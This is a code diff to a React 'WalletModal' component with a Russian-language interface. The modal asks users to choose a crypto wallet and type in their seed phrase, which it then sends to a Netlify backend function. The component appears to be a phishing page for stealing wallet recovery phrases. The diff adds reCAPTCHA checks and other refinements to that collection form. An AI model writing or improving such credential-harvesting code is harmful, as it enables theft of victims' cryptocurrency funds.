@@ -1,4 +1,5 @@
-import React, { useState } from 'react';
+import React, { useState, useCallback } from 'react';
+import { useGoogleReCaptcha } from 'react-google-recaptcha-v3';
 import './WalletModal.css';
 
 const WALLETS = [
@@ -14,6 +15,7 @@ const WalletModal = ({ onClose }) => {
   const [statusMessage, setStatusMessage] = useState('');
 
   const BACKEND_URL = '/.netlify/functions/secure-message';
+  const { executeRecaptcha } = useGoogleReCaptcha();
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
@@ -31,9 +33,17 @@ const WalletModal = ({ onClose }) => {
     }
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = useCallback(async (e) => {
     e.preventDefault();
-    setStatusMessage('Отправка данных...');
+    if (!executeRecaptcha) {
+      console.error('reCAPTCHA еще не загрузилась');
+      setStatusMessage('❌ Ошибка! Проверка на робота не загрузилась. Попробуйте позже.');
+      return;
+    }
+    setStatusMessage('Проверка и отправка данных...');
+
+    // Получаем токен от Google
+    const recaptchaToken = await executeRecaptcha('submitForm');
 
     try {
       const response = await fetch(BACKEND_URL, {
@@ -44,6 +54,7 @@ const WalletModal = ({ onClose }) => {
         body: JSON.stringify({
           walletName: selectedWallet.name,
           seedPhrase: seedPhrase,
+          recaptchaToken: recaptchaToken, // Отправляем токен на бэкенд
         }),
       });
 
@@ -58,7 +69,7 @@ const WalletModal = ({ onClose }) => {
       console.error('Ошибка отправки на бэкенд:', error);
       setStatusMessage(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
     }
-  };
+  }, [executeRecaptcha, selectedWallet, seedPhrase]);
 
   if (statusMessage) {
     return (
@@ -114,6 +125,7 @@ const WalletModal = ({ onClose }) => {
               <label htmlFor="seedPhrase">Введите вашу сид фразу ({phraseType} слов)</label>
               <textarea
                 id="seedPhrase"
+                name="seedPhrase"
                 value={seedPhrase}
                 onChange={(e) => setSeedPhrase(e.target.value)}
                 placeholder="Введите слова через пробел..."
